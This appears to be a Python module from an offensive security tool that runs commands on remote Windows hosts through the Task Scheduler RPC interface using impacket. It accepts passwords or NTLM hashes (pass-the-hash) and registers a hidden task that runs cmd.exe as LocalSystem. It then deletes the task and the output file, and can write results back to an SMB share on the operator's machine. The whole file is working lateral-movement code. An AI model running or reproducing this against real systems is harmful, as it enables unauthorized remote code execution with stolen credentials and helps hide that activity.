import os
from time import sleep
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import tsch, transport

from ar3.helpers.misc import gen_random_string, get_local_ip

class TSCHEXEC():
    def __init__(self, logger, host, args, smb_con, share_name=False):
        self.outfile = gen_random_string()
        self.debug = args.debug
        self.logger = logger
        self.host = host
        self.domain = args.domain
        self.username = args.user
        self.password = args.passwd

        self.hash = args.hash
        self.lmhash = ''
        self.nthash = ''

        self.noOutput = args.no_output
        self.outputBuffer = ''

        self.timeout = args.timeout
        self.smbcon = smb_con
        self.fileless_output = False

        if share_name:
            # Fileless output
            self.fileless_output = True
            self.ip = get_local_ip()
            self.share = share_name
            self.path = "\\"
        else:
            # Filed or Remote output
            self.ip = args.exec_ip
            self.share = args.exec_share
            self.path = args.exec_path

        if self.hash:
            try:
                self.lmhash, self.nthash = self.hash.split(':')
            except:
                self.nthash = self.hash

    def execute(self, command):
        self.__outputBuffer = ''

        stringbinding = r'ncacn_np:{}[\pipe\atsvc]'.format(self.host)
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)

        if self.fileless_output:
            self.tmpfile = "\\\\{}\\{}{}".format(self.ip, self.share, self.path+self.outfile)
        else:
            self.tmpfile = "%windir%\\Temp\\{}".format(self.outfile)

        self.doStuff(command)
        return self.__outputBuffer

    def gen_xml(self, command):

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.noOutput:
            argument_xml = "      <Arguments>/C {}</Arguments>".format(command)
        else:
            argument_xml = "      <Arguments>/C {} &gt; {} 2&gt;&amp;1</Arguments>".format(command, self.tmpfile)
        self.logger.debug('Generated argument XML: ' + argument_xml)

        xml += argument_xml
        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def doStuff(self, command):
        dce = self.__rpctransport.get_dce_rpc()
        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = gen_random_string(8)
        tmpFileName = tmpName + '.tmp'

        xml = self.gen_xml(command)
        taskCreated = False
        self.logger.debug('Creating task \\{}'.format(tmpName))
        tsch.hSchRpcRegisterTask(dce, '\\{}'.format(tmpName), xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        taskCreated = True

        self.logger.debug('Running task \\{}'.format(tmpName))
        tsch.hSchRpcRun(dce, '\\{}'.format(tmpName))

        done = False
        while not done:
            self.logger.debug('Calling SchRpcGetLastRunInfo for \\{}'.format(tmpName))
            resp = tsch.hSchRpcGetLastRunInfo(dce, '\\{}'.format(tmpName))
            if resp['pLastRuntime']['wYear'] != 0:
                done = True
            else:
                sleep(2)

        self.logger.debug('Deleting task \\{}'.format(tmpName))
        tsch.hSchRpcDelete(dce, '\\{}'.format(tmpName))
        taskCreated = False

        if taskCreated is True:
            tsch.hSchRpcDelete(dce, '\\{}'.format(tmpName))

            # Get output
        if self.noOutput:
            self.__outputBuffer = "Command executed with no output"
        elif self.fileless_output:
            self.get_output_fileless()
        else:
            self.get_output()
        dce.disconnect()

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data.decode('utf-8')

        waitOnce = True
        while True:
            try:
                self.logger.debug('Attempting to read ADMIN$\\Temp\\{}'.format(self.outfile))
                self.smbcon.con.getFile('ADMIN$', "Temp\\{}".format(self.outfile), output_callback)
                break
            except Exception as e:
                if str(e).find('SHARING') > 0:
                    sleep(3)
                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                    if waitOnce is True:
                        # We're giving it the chance to flush the file before giving up
                        sleep(3)
                        waitOnce = False
                    else:
                        raise
                else:
                    raise
        self.logger.debug('Deleting file ADMIN$\\Temp\\{}'.format(self.outfile))
        self.smbcon.con.deleteFile('ADMIN$', 'Temp\\{}'.format(self.outfile))

    def get_output_fileless(self):
        def output_callback_fileless(data):
            self.__outputBuffer += data
        while True:
            try:
                with open(os.path.join('/tmp', '.ar3', self.outfile), 'r') as output:
                    output_callback_fileless(output.read())
                break
            except IOError:
                sleep(2)